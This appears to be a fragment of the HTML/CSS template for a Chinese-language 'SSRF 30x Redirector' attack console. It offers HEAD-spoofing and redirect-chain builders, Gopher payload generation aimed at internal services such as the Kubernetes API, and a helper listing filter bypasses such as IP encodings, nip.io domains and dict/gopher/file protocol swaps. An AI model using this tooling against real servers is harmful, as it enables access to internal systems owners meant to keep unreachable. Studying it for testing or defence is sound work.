        .step-title { font-weight: 700; font-size: 14px; }
        .step-form { display: grid; grid-template-columns: 1fr; gap: 10px; }
        .step-input-group { display: flex; gap: 10px; width: 100%; }

        /* Protocol Tip */
        .protocol-tip {
            font-size: 14px;
            color: var(--text-secondary);
            background: var(--bg-input);
            padding: 16px 20px;
            border-radius: var(--radius-sm);
            border-left: 4px solid var(--accent-yellow);
            margin-bottom: 20px;
            line-height: 1.7;
        }
        .protocol-tip.tip-cyan { border-left-color: var(--accent-cyan); }
        .protocol-tip.tip-orange { border-left-color: var(--accent-orange); }

        /* HEAD Bypass Toggle */
        .head-bypass-toggle {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 12px 16px;
            background: rgba(57, 213, 255, 0.04);
            border: 1px solid rgba(57, 213, 255, 0.2);
            border-radius: var(--radius-sm);
            margin-bottom: 16px;
            cursor: pointer;
            transition: var(--transition);
        }
        .head-bypass-toggle:hover {
            border-color: rgba(57, 213, 255, 0.5);
            background: rgba(57, 213, 255, 0.08);
        }
        .head-bypass-toggle input[type="checkbox"] {
            width: 18px;
            height: 18px;
            accent-color: var(--accent-cyan);
            cursor: pointer;
        }
        .head-bypass-toggle .toggle-label {
            font-size: 14px;
            font-weight: 600;
            color: var(--accent-cyan);
        }
        .head-bypass-toggle .toggle-desc {
            font-size: 12px;
            color: var(--text-muted);
            margin-left: auto;
        }
        .head-bypass-config {
            display: none;
            margin-top: 10px;
            padding: 14px;
            background: var(--bg-primary);
            border: 1px dashed rgba(57, 213, 255, 0.3);
            border-radius: var(--radius-sm);
        }
        .head-bypass-config.show { display: block; }
        .head-bypass-config label {
            font-size: 12px;
            color: var(--accent-cyan);
            margin-bottom: 4px;
            display: block;
        }
        .head-bypass-config input,
        .head-bypass-config select {
            padding: 8px 12px;
            font-size: 13px;
            margin-bottom: 8px;
        }

        /* SSRF Bypass Helper */
        .bypass-panel {
            background: var(--bg-primary);
            border: 1px solid rgba(57, 213, 255, 0.25);
            border-radius: var(--radius-sm);
            padding: 18px;
            margin-bottom: 16px;
        }
        .bypass-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 10px;
            margin-bottom: 12px;
        }
        .bypass-grid label {
            font-size: 11px;
            color: var(--accent-cyan);
            display: block;
            margin-bottom: 4px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .bypass-grid input { padding: 9px 12px; font-size: 13px; }
        .bypass-variants {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            margin-top: 14px;
        }
        .variant-chip {
            padding: 6px 12px;
            background: rgba(57, 213, 255, 0.07);
            border: 1px solid rgba(57, 213, 255, 0.3);
            color: var(--accent-cyan);
            border-radius: 6px;
            font-size: 12px;
            cursor: pointer;
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            transition: var(--transition);
        }
        .variant-chip:hover {
            background: rgba(57, 213, 255, 0.2);
            border-color: var(--accent-cyan);
            transform: translateY(-1px);
        }
        .variant-chip .vlabel {
            color: var(--text-muted);
            margin-right: 6px;
            font-weight: 600;
        }
        .bypass-tips {
            margin-top: 14px;
            font-size: 12px;
            color: var(--text-secondary);
            background: var(--bg-input);
            padding: 12px 16px;
            border-radius: 6px;
            border-left: 4px solid var(--accent-cyan);
            line-height: 1.9;
        }

        /* v2.1: 盲SSRF基准测试面板 */
        .bb-create-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-bottom: 10px;
        }
        .bb-create-grid label {
            font-size: 11px;
            color: var(--accent-purple);
            display: block;
            margin-bottom: 4px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .bb-create-grid input,
        .bb-create-grid select { padding: 9px 12px; font-size: 13px; }
        .bb-path-wrap { display: flex; align-items: stretch; }
        .bb-path-prefix {
            display: flex; align-items: center;
            padding: 0 10px;
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-right: none;
            border-radius: var(--radius-sm) 0 0 var(--radius-sm);
            color: var(--accent-purple);
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            font-size: 13px;
            font-weight: 700;
        }
        .bb-path-wrap input { border-radius: 0 var(--radius-sm) var(--radius-sm) 0 !important; }
        .bb-item {
            background: var(--bg-input);
            border: 1px solid var(--border-color);
            border-left: 4px solid var(--accent-purple);
            border-radius: var(--radius-sm);
            padding: 14px 16px;
            margin-bottom: 10px;
            transition: var(--transition);
        }
        .bb-item:hover { border-color: var(--border-hover); border-left-color: var(--accent-purple); }
        .bb-item-head {
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
            margin-bottom: 6px;
        }
        .bb-url {
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            color: var(--accent-yellow);
            font-size: 13px;
            word-break: break-all;
        }
        .bb-badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 800;
            letter-spacing: 0.3px;
        }
        .bb-2xx { background: rgba(63, 185, 80, 0.15); color: var(--accent-green); }
        .bb-3xx { background: rgba(88, 166, 255, 0.15); color: var(--accent); }
        .bb-4xx { background: rgba(240, 136, 62, 0.15); color: var(--accent-orange); }
        .bb-5xx { background: rgba(248, 81, 73, 0.15); color: var(--accent-red); }
        .bb-delay-badge { background: rgba(188, 140, 255, 0.12); color: var(--accent-purple); }
        .bb-meta { font-size: 12px; color: var(--text-muted); }
        .bb-meta b { color: var(--accent-purple); }
        .bb-actions { display: flex; gap: 6px; flex-wrap: wrap; margin-top: 8px; }
        .bb-edit-form {
            margin-top: 10px;
            padding: 14px;
            background: var(--bg-primary);
            border: 1px dashed rgba(188, 140, 255, 0.35);
            border-radius: var(--radius-sm);
        }
        .bb-edit-form label {
            font-size: 11px;
            color: var(--accent-purple);
            display: block;
            margin-bottom: 4px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .bb-edit-form input,
        .bb-edit-form select,
        .bb-edit-form textarea { padding: 9px 12px; font-size: 13px; margin-bottom: 8px; }
        .bb-edit-form textarea { min-height: 90px; font-family: 'JetBrains Mono', 'Fira Code', monospace; }
        .bb-preview {
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            font-size: 12px;
            color: var(--text-secondary);
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            padding: 8px 12px;
            margin-top: 6px;
            max-height: 120px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-break: break-all;
        }

        /* Logs */
        .logs-container { max-height: 750px; overflow-y: auto; }
        .log-entry {
            background: var(--bg-input);
            border-radius: var(--radius-sm);
            padding: 16px 18px;
            margin-bottom: 10px;
            border-left: 4px solid var(--accent-green);
            font-size: 13px;
            cursor: pointer;
            transition: var(--transition);
            position: relative;
            border: 1px solid var(--border-color);
            border-left: 4px solid var(--accent-green);
        }
        .log-entry.log-head-bypass { border-left-color: var(--accent-cyan); }
        .log-entry:hover { background: rgba(56, 189, 248, 0.04); border-color: var(--border-hover); border-left-color: var(--accent-green); }
        .log-entry.log-head-bypass:hover { border-left-color: var(--accent-cyan); }
        .log-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
        }
        .log-ip { color: var(--accent-red); font-weight: 700; font-size: 14px; }
        .log-detail {
            display: grid;
            grid-template-columns: 80px 1fr;
            gap: 6px;
            align-items: baseline;
        }
        .log-label { color: var(--text-muted); font-size: 12px; font-weight: 600; text-transform: uppercase; }
        .log-value { color: var(--text-secondary); word-break: break-all; font-size: 13px; }
        .log-value.url { color: var(--accent-yellow); }
        .method-badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 800;
            margin-right: 6px;
            letter-spacing: 0.3px;
        }
        .method-GET { background: rgba(63, 185, 80, 0.15); color: var(--accent-green); }
        .method-POST { background: rgba(248, 81, 73, 0.15); color: var(--accent-red); }
        .method-OPTIONS { background: rgba(210, 153, 34, 0.15); color: var(--accent-yellow); }
        .method-PUT { background: rgba(188, 140, 255, 0.15); color: var(--accent-purple); }
        .method-HEAD { background: rgba(57, 213, 255, 0.15); color: var(--accent-cyan); }
        pre.log-pre {
            margin: 0;
            font-size: 12px;
            white-space: pre-wrap;
            word-break: break-word;
            max-height: 220px;
            overflow-y: auto;
            background: var(--bg-primary);
            padding: 14px;
            border-radius: var(--radius-sm);
            color: var(--text-secondary);
            border: 1px solid var(--border-color);
            line-height: 1.6;
        }
        .delete-log-btn {
            position: absolute;
            top: 10px;
            right: 10px;
            background: rgba(248, 81, 73, 0.12);
            color: var(--accent-red);
            border: none;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            font-size: 13px;
            line-height: 1;
            cursor: pointer;
            display: none;
            align-items: center;
            justify-content: center;
            padding: 0;
            transition: var(--transition);
        }
        .delete-log-btn:hover { background: rgba(248, 81, 73, 0.25); }
        .log-entry:hover .delete-log-btn { display: flex; }

        /* Timeline (命中时间轴) */
        .timeline-row {
            display: grid;
            grid-template-columns: 150px 90px 160px 1fr;
            gap: 10px;
            align-items: center;
            padding: 11px 14px;
            background: var(--bg-input);
            border: 1px solid var(--border-color);
            border-left: 4px solid var(--text-muted);
            border-radius: 6px;
            margin-bottom: 8px;
            font-size: 12px;
            transition: var(--transition);
        }
        .timeline-row:hover { border-color: var(--border-hover); }
        .timeline-row.verdict-slow { border-left-color: var(--accent-green); }
        .timeline-row.verdict-fast { border-left-color: var(--text-muted); }
        .timeline-row.verdict-first { border-left-color: var(--accent); }
        .tl-time { color: var(--text-secondary); font-family: 'JetBrains Mono', monospace; }
        .tl-delta { color: var(--accent-yellow); font-weight: 700; font-family: 'JetBrains Mono', monospace; }
        .tl-verdict {
            padding: 3px 8px;
            border-radius: 10px;
            font-weight: 700;
            text-align: center;
            white-space: nowrap;
            font-size: 11px;
        }
        .tl-target {
            color: var(--accent-cyan);
            font-family: 'JetBrains Mono', monospace;
            word-break: break-all;
        }

        /* Request Editor */
        .req-editor {
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-sm);
            padding: 18px;
            margin-top: 14px;
        }
        .req-editor label {
            font-size: 12px;
            color: var(--text-muted);
            display: block;
            margin-bottom: 6px;
            text-transform: uppercase;
            font-weight: 600;
            letter-spacing: 0.5px;
        }
        .req-editor input,
        .req-editor textarea,
        .req-editor select {
            width: 100%;
            padding: 12px 14px;
            background: var(--bg-input);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            color: var(--text-primary);
            margin-bottom: 10px;
            font-size: 14px;
        }
        .req-editor textarea {
            min-height: 90px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            resize: vertical;
        }
        .header-row {
            display: flex;
            gap: 8px;
            margin-bottom: 8px;
        }
        .header-row input { flex: 1; }
        .header-row button { flex: 0 0 auto; }

        /* Dual Editor Layout */
        .dual-editor-layout {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
            margin-top: 14px;
        }
        .dual-editor-layout .req-editor {
            margin-top: 0;
        }
        .raw-editor-panel {
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-sm);
            padding: 18px;
        }
        .raw-editor-panel .raw-title {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }
        .raw-editor-panel .raw-title h4 {
            font-size: 13px;
            color: var(--accent-orange);
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .raw-editor-panel textarea.raw-request-area {
            width: 100%;
            min-height: 320px;
            padding: 16px;
            background: var(--bg-input);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-sm);
            color: var(--accent-green);
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            font-size: 13px;
            line-height: 1.6;
            resize: vertical;
            white-space: pre;
            overflow-wrap: normal;
            overflow-x: auto;
        }
        .raw-editor-panel textarea.raw-request-area:focus {
            outline: none;
            border-color: var(--accent-orange);
            box-shadow: 0 0 0 3px rgba(240, 136, 62, 0.1);
        }
        .raw-editor-btns {
            display: flex;
            gap: 8px;
            margin-top: 12px;
            flex-wrap: wrap;
        }

        /* Chain Manager */
        .chain-manager {
            margin-top: 28px;
            border-top: 1px solid var(--border-color);
            padding-top: 28px;
        }
        .chain-manager h3 {
            color: var(--accent);
            margin-bottom: 18px;
            font-size: 1.1em;
            font-weight: 700;
        }
        .chain-item {
            background: var(--bg-input);
            border-radius: var(--radius-sm);
            padding: 20px;
            margin-bottom: 14px;
            border: 1px solid var(--border-color);
            transition: var(--transition);
        }
        .chain-item:hover { border-color: var(--border-hover); }
        .chain-item-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }
        .chain-item-id { color: var(--accent); font-weight: 700; font-size: 15px; }
        .chain-item-time { color: var(--text-muted); font-size: 12px; }
        .chain-item-steps { font-size: 13px; color: var(--text-secondary); margin-bottom: 10px; line-height: 1.7; }
        .chain-item-steps .step-path { color: var(--accent-yellow); margin-right: 4px; font-weight: 600; }
        .chain-item-final {
            font-size: 13px;
            color: var(--accent-green);
            word-break: break-all;
            margin-bottom: 12px;
            padding: 12px;
            background: var(--bg-primary);
            border-radius: 6px;
            font-family: 'JetBrains Mono', monospace;
            border: 1px solid var(--border-color);
        }
        .chain-item-actions {
            display: flex;
            gap: 10px;
            align-items: center;
            flex-wrap: wrap;
        }
        .chain-edit-input {
            flex: 1;
            min-width: 200px;
            padding: 10px 14px;
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            color: var(--text-primary);
            font-size: 13px;
            font-family: 'JetBrains Mono', monospace;
        }
        .chain-edit-btn {
            padding: 8px 16px;
            font-size: 13px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 700;
            transition: var(--transition);
        }
        .chain-edit-btn:hover { opacity: 0.85; transform: translateY(-1px); }
        .chain-save-btn { background: var(--accent-green); color: #0d1117; }
        .chain-delete-btn { background: var(--accent-red); color: #fff; }
        .chain-copy-btn { background: var(--accent); color: #0d1117; }
        .no-chains-msg { text-align: center; padding: 40px; color: var(--text-muted); font-size: 15px; }

        /* HEAD badge in chain */
        .head-bypass-badge {
            display: inline-flex;
            align-items: center;
            gap: 4px;
            padding: 3px 10px;
            background: rgba(57, 213, 255, 0.1);
            color: var(--accent-cyan);
            border-radius: 12px;
            font-size: 11px;
            font-weight: 700;
            margin-left: 8px;
        }
        .fallback-badge {
            display: inline-flex;
            align-items: center;
            gap: 4px;
            padding: 3px 10px;
            background: rgba(240, 136, 62, 0.1);
            color: var(--accent-orange);
            border-radius: 12px;
            font-size: 11px;
            font-weight: 700;
            margin-left: 8px;
        }

        /* Queue */
        .queue-section {
            margin-top: 16px;
            border-top: 1px solid var(--border-color);
            padding-top: 16px;
        }
        .queue-section h4 {
            font-size: 13px;
            color: var(--accent-purple);
            margin-bottom: 10px;
            font-weight: 700;
        }
        .queue-textarea {
            width: 100%;
            min-height: 100px;
            padding: 14px;
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-sm);
            color: var(--text-primary);
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            resize: vertical;
            margin-bottom: 10px;
            line-height: 1.6;
        }
        .queue-textarea:focus { outline: none; border-color: var(--accent-purple); }
        .queue-status {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-top: 10px;
            font-size: 13px;
            color: var(--text-secondary);
        }
        .queue-badge {
            display: inline-flex;
            align-items: center;
            gap: 5px;
            padding: 4px 10px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 700;
        }
        .queue-badge-active { background: rgba(63, 185, 80, 0.12); color: var(--accent-green); }
        .queue-badge-count { background: rgba(188, 140, 255, 0.12); color: var(--accent-purple); }
        .queue-mode-label {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 13px;
            color: var(--text-secondary);
            margin-bottom: 8px;
        }
        .queue-mode-label select { width: auto; padding: 6px 10px; font-size: 13px; }

        /* Queue Preset Buttons */
        .queue-presets-section {
            margin-bottom: 14px;
            padding: 14px;
            background: rgba(188, 140, 255, 0.04);
            border: 1px solid rgba(188, 140, 255, 0.15);
            border-radius: var(--radius-sm);
        }
        .queue-presets-section .preset-title {
            font-size: 12px;
            color: var(--accent-purple);
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 10px;
        }
        .preset-btns {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
        }
        .preset-btn {
            padding: 6px 14px;
            font-size: 12px;
            font-weight: 600;
            border: 1px solid rgba(188, 140, 255, 0.3);
            background: rgba(188, 140, 255, 0.08);
            color: var(--accent-purple);
            border-radius: 6px;
            cursor: pointer;
            transition: var(--transition);
            white-space: nowrap;
        }
        .preset-btn:hover {
            background: rgba(188, 140, 255, 0.2);
            border-color: var(--accent-purple);
            transform: translateY(-1px);
        }
        .preset-btn.active {
            background: var(--accent-purple);
            color: #0d1117;
            border-color: var(--accent-purple);
        }
        .preset-desc {
            font-size: 12px;
            color: var(--text-muted);
            margin-top: 8px;
            padding: 6px 10px;
            background: var(--bg-primary);
            border-radius: 4px;
            display: none;
        }
        .preset-desc.show { display: block; }

        .copy-raw-btn {
            background: rgba(88, 166, 255, 0.08);
            color: var(--accent);
            border: 1px solid rgba(88, 166, 255, 0.25);
            padding: 4px 10px;
            border-radius: 4px;
            font-size: 11px;
            cursor: pointer;
            margin-left: 8px;
            transition: var(--transition);
        }
        .copy-raw-btn:hover { background: rgba(88, 166, 255, 0.18); }
        .manual-refresh-btn {
            background: rgba(88, 166, 255, 0.08);
            color: var(--accent);
            border: 1px solid rgba(88, 166, 255, 0.25);
            padding: 8px 18px;
            border-radius: var(--radius-sm);
            font-size: 14px;
            cursor: pointer;
            font-weight: 600;
            transition: var(--transition);
        }
        .manual-refresh-btn:hover { background: rgba(88, 166, 255, 0.18); }

        /* Scrollbar */
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: rgba(88, 166, 255, 0.15); border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: rgba(88, 166, 255, 0.3); }

        /* Responsive */
        @media (max-width: 1200px) {
            .grid { grid-template-columns: 1fr; }
            .dual-editor-layout { grid-template-columns: 1fr; }
            .bypass-grid { grid-template-columns: repeat(2, 1fr); }
            .timeline-row { grid-template-columns: 1fr 1fr; }
            body { padding: 20px; }
        }
        @media (max-width: 768px) {
            .stats { grid-template-columns: repeat(2, 1fr); }
            .header h1 { font-size: 1.6em; }
            body { padding: 16px; font-size: 14px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚡ SSRF 30x Redirector</h1>
            <p>云原生穿透引擎 · K8s/Docker 307无损引流 · Gopher封装 · 批量队列投递 · Burp风格编辑器 · HEAD伪装绕过 · 降级跳转 · 命中时间轴 · SSRF绕过助手 · 盲SSRF基准测试</p>
            <p style="margin-top:8px;font-size:12px;color:var(--accent);font-family:'JetBrains Mono','Fira Code',monospace;">
                🔐 本次随机控制台路径: {{ console_path }}/ &nbsp;·&nbsp; 重启后变更, 请妥善保存
            </p>
        </div>
        <div class="stats">
            <div class="stat-item"><div class="stat-value" id="totalLogs">0</div><div class="stat-label">访问记录</div></div>
            <div class="stat-item"><div class="stat-value" id="uniqueIPs">0</div><div class="stat-label">唯一IP</div></div>
            <div class="stat-item"><div class="stat-value">{{ poc_count }}</div><div class="stat-label">内置POC</div></div>
            <div class="stat-item"><div class="stat-value" style="color:var(--accent);" id="chainCount">0</div><div class="stat-label">活跃链</div></div>
        </div>

        <div class="grid">
            <div class="card">
                <h2>🛠 Payload 构建控制台</h2>
                <div class="nav-tabs">
                    <button class="nav-tab active" data-tab="basic">基础跳转</button>
                    <button class="nav-tab" data-tab="stateless">智能链</button>
                    <button class="nav-tab" data-tab="stateful">有状态链</button>
                    <button class="nav-tab" data-tab="blindbench">盲SSRF基准</button>
                </div>

                <!-- 基础单次模式 -->
                <div id="tab-basic" class="tab-content active">
                    <div class="protocol-tip tip-cyan">
                        <b>🛡️ HEAD伪装模式说明：</b> 某些服务器(如Java HttpURLConnection)会先用HEAD请求探测，如果收到30x则认为目标不存在而拒绝后续GET请求。<br>
                        开启HEAD伪装后，HEAD请求返回200 OK(通过预检)，GET/POST等请求正常返回30x重定向(触发SSRF)。
                    </div>
                    <div class="head-bypass-toggle" onclick="document.getElementById('hbBasicCheck').click();">
                        <input type="checkbox" id="hbBasicCheck" onclick="event.stopPropagation(); toggleHeadBypassConfig('basic');">
                        <span class="toggle-label">🔀 启用 HEAD 伪装绕过</span>
                        <span class="toggle-desc">HEAD→200 / GET→30x</span>
                    </div>
                    <div class="head-bypass-config" id="hbBasicConfig">
                        <label>HEAD响应伪装状态码</label>
                        <select id="hbBasicStatus">
                            <option value="200" selected>200 OK (推荐)</option>
                            <option value="204">204 No Content</option>
                            <option value="403">403 Forbidden (伪装需认证)</option>
                        </select>
                        <label>Content-Type 伪装</label>
                        <input type="text" id="hbBasicContentType" value="text/html; charset=utf-8" placeholder="text/html; charset=utf-8">
                        <label>伪装 Content-Length</label>
                        <input type="text" id="hbBasicContentLength" value="8192" placeholder="8192">
                    </div>
                    <div class="form-group">
                        <label>跳转方式 (目标不跟随30x时选降级模式)</label>
                        <select id="redirectMode" onchange="onBasicModeChange()">
                            <option value="30x" selected>30x 重定向 (标准)</option>
                            <option value="refresh">Refresh 响应头 (200)</option>
                            <option value="meta">Meta 刷新 (200 + HTML)</option>
                            <option value="js">JS 跳转 (200 + Script)</option>
                            <option value="combo">组合模式 (Refresh + Meta + JS)</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>响应码 (K8s HTTPS POST → 选 307)</label>
                        <select id="statusCode"></select>
                    </div>
                    <div class="form-group">
                        <label>快捷POC</label>
                        <select id="pocSelect"><option value="">-- 手动输入目标URL --</option></select>
                    </div>
                    <div class="form-group">
                        <label>目标URL (支持 dict/gopher/file)</label>
                        <input type="text" id="targetUrl" placeholder="http://127.0.0.1/">
                    </div>
                    <button class="btn btn-cyan btn-small" onclick="toggleBypassHelper()" style="margin-bottom:14px;">🧩 SSRF 绕过助手</button>
                    <div class="bypass-panel" id="bypassPanel" style="display:none;">
                        <div class="bypass-grid">
                            <div>
                                <label>目标 IP</label>
                                <input type="text" id="bypassIp" value="127.0.0.1">
                            </div>
                            <div>
                                <label>端口 (可选)</label>
                                <input type="text" id="bypassPort" placeholder="80">
                            </div>
                            <div>
                                <label>路径 (可选)</label>
                                <input type="text" id="bypassPath" placeholder="/">
                            </div>
                            <div>
                                <label>伪装域名 (@欺骗)</label>
                                <input type="text" id="bypassDomain" value="www.baidu.com">
                            </div>
                        </div>
                        <button class="btn btn-cyan btn-small" onclick="generateBypassVariants()">⚡ 生成绕过变体</button>
                        <button class="btn btn-green btn-small" onclick="copyAllBypassVariants()">📋 复制全部变体</button>
                        <div class="bypass-variants" id="bypassVariants"></div>
                        <div class="bypass-tips">
                            <b>💡 绕过原理速查 (按原理分类)：</b><br>
                            <b>📐 进制变形</b> —— 十进制/十六进制/八进制整型, 点分变形, 混合进制, 短格式, 零填充: 绕过正则类 IPv4 黑名单<br>
                            <b>🌐 IPv6 变形</b> —— 映射/兼容/环回: 绕过仅匹配 IPv4 格式的校验<br>
                            <b>🔗 DNS 域名解析</b> —— nip.io/sslip.io/localtest.me: 域名解析指向内网, 绕过 IP 黑名单<br>
                            <b>🎭 URL 解析差异</b> —— @欺骗/多重斜杠/反斜杠/URL编码/双重编码/Fragment: 利用解析器实现差异<br>
                            <b>🔄 30x / 降级跳转</b> (本工具核心) —— 绕过"发起前校验URL"类过滤<br>
                            <b>⏱ DNS Rebinding</b> —— 对抗"解析后校验IP再请求"的目标 (需自建双A记录DNS, TOCTOU竞态)<br>
                            <b>📦 协议替换</b> —— dict:// gopher:// file:// netdoc:// 绕过协议白名单薄弱点
                        </div>
                    </div>
                    <button class="btn btn-warning btn-small" onclick="toggleBasicEditor()" style="margin-bottom:14px;">✏️ 高级请求编辑</button>
                    <div class="dual-editor-layout" id="basicDualEditor" style="display:none;">
                        <div class="req-editor" id="basicReqEditor">
                            <label style="color:var(--accent);font-size:13px;margin-bottom:14px;display:block;">📝 结构化编辑</label>
                            <label>请求方法</label>
                            <select class="req-method">
                                <option value="GET">GET</option>
                                <option value="POST" selected>POST</option>
                                <option value="PUT">PUT</option>
                                <option value="DELETE">DELETE</option>
                                <option value="OPTIONS">OPTIONS</option>
                                <option value="HEAD">HEAD</option>
                                <option value="PATCH">PATCH</option>
                            </select>
                            <label>Host</label>
                            <input type="text" class="req-host" placeholder="127.0.0.1:8080">
                            <label>路径</label>
                            <input type="text" class="req-path" placeholder="/api/v1/...">
                            <label>请求头</label>
                            <div class="req-headers" id="basicReqHeaders"></div>
                            <button class="btn btn-ghost btn-small" onclick="addHeaderRow('basicReqHeaders')" style="margin-bottom:10px;">+ 添加请求头</button>
                            <label>请求体</label>
                            <textarea class="req-body" placeholder="JSON或任意格式"></textarea>
                            <div style="display:flex;gap:8px;margin-top:8px;">
                                <button class="btn btn-small" onclick="applyBasicCustomRequest()">✅ 生成 Gopher Payload</button>
                                <button class="btn btn-orange btn-small" onclick="syncStructuredToRaw('basicReqEditor','basicRawArea')">→ 同步到Raw</button>
                            </div>
                        </div>
                        <div class="raw-editor-panel" id="basicRawPanel">
                            <div class="raw-title">
                                <h4>🔧 Burp 风格 Raw 编辑器</h4>
                                <button class="copy-raw-btn" onclick="copyRawEditorContent('basicRawArea')">📋 复制</button>
                            </div>
                            <textarea class="raw-request-area" id="basicRawArea" placeholder="粘贴或编辑原始HTTP请求:&#10;&#10;POST /api/v1/pods HTTP/1.1&#10;Host: kubernetes.default.svc&#10;Content-Type: application/json&#10;Authorization: Bearer <token>&#10;&#10;{&quot;apiVersion&quot;:&quot;v1&quot;,...}" spellcheck="false"></textarea>
                            <div class="raw-editor-btns">
                                <button class="btn btn-orange btn-small" onclick="parseRawToStructured('basicRawArea','basicReqEditor')">← 解析到结构化</button>
                                <button class="btn btn-small" onclick="rawToGopher('basicRawArea','targetUrl')">✅ Raw → Gopher</button>
                                <button class="btn btn-ghost btn-small" onclick="beautifyRawBody('basicRawArea')">🎨 格式化Body</button>
                            </div>
                        </div>
                    </div>
                    <button class="btn" onclick="generateBasicPayload()" style="margin-top:14px;">生成 Payload</button>
                </div>

                <!-- 无状态链式模式 -->
                <div id="tab-stateless" class="tab-content">
                    <div class="protocol-tip">
                        <b>云原生 POST 说明：</b> HTTP目标可用 Gopher 封装POST请求；HTTPS目标 (如K8s) 自动切 307 保留方法。
                    </div>
                    <div class="head-bypass-toggle" onclick="document.getElementById('hbStatelessCheck').click();">
                        <input type="checkbox" id="hbStatelessCheck" onclick="event.stopPropagation();">
                        <span class="toggle-label">🔀 启用 HEAD 伪装绕过 (全链)</span>
                        <span class="toggle-desc">所有节点HEAD→200</span>
                    </div>

                    <div style="margin-bottom: 16px; display: flex; gap: 10px; flex-wrap: wrap;">
                        <button class="btn btn-secondary btn-small" onclick="addStatelessStep(false)">+ 中转节点</button>
                        <button class="btn btn-small" onclick="addStatelessStep(true)">+ 终点节点</button>
                        <button class="btn btn-warning btn-small" onclick="quickSetup()">⚡ 快捷(1+1)</button>
                        <button class="btn btn-danger" onclick="document.getElementById('statelessStepsContainer').innerHTML=''; stepCount=0;">清空</button>
                    </div>

                    <div id="statelessStepsContainer"></div>

                    <div class="form-group" style="margin-top:16px;">
                        <label>末跳降级方式 (目标不跟随30x时选用)</label>
                        <select id="statelessFinalMode">
                            <option value="30x" selected>30x 重定向 (标准)</option>
                            <option value="refresh">Refresh 响应头 (200)</option>
                            <option value="meta">Meta 刷新 (200 + HTML)</option>
                            <option value="js">JS 跳转 (200 + Script)</option>
                            <option value="combo">组合模式 (Refresh + Meta + JS)</option>
                        </select>
                    </div>

                    <button class="btn" onclick="generateStatelessChain()" style="margin-top: 14px;">🚀 生成链式 Payload</button>
                </div>

                <!-- 有状态路径隐藏链 Tab -->
                <div id="tab-stateful" class="tab-content">
                    <div class="protocol-tip">
                        <b>有状态路径隐藏链：</b> URL中无编码参数，自定义短路径逐级跳转。支持批量队列模式：每次请求依次响应不同POC。
                    </div>
                    <div class="head-bypass-toggle" onclick="document.getElementById('hbStatefulCheck').click();">
                        <input type="checkbox" id="hbStatefulCheck" onclick="event.stopPropagation();">
                        <span class="toggle-label">🔀 启用 HEAD 伪装绕过 (全链)</span>
                        <span class="toggle-desc">所有节点HEAD→200, GET/POST→30x</span>
                    </div>

                    <div style="margin-bottom: 16px; display: flex; gap: 10px;">
                        <button class="btn btn-secondary btn-small" onclick="addStatefulStep(false)">+ 中转节点</button>
                        <button class="btn btn-small" onclick="addStatefulStep(true)">+ 终点节点</button>
                        <button class="btn btn-danger" onclick="document.getElementById('statefulStepsContainer').innerHTML=''; statefulStepCount=0;">清空</button>
                    </div>

                    <div id="statefulStepsContainer"></div>

                    <div class="form-group" style="margin-top:20px;" id="finalTargetGroup" hidden>
                        <label>快捷POC</label>
                        <select id="statefulPocSelect"><option value="">-- 手动输入 --</option></select>
                        <label style="margin-top: 10px;">最终目标 URL</label>
                        <input type="text" id="statefulFinalTarget" placeholder="http://target.internal/service">
                        <label style="margin-top: 10px;">末跳降级方式 (可选)</label>
                        <select id="statefulFinalMode">
                            <option value="30x" selected>30x 重定向 (标准)</option>
                            <option value="refresh">Refresh 响应头 (200)</option>
                            <option value="meta">Meta 刷新 (200 + HTML)</option>
                            <option value="js">JS 跳转 (200 + Script)</option>
                            <option value="combo">组合模式 (Refresh + Meta + JS)</option>
                        </select>
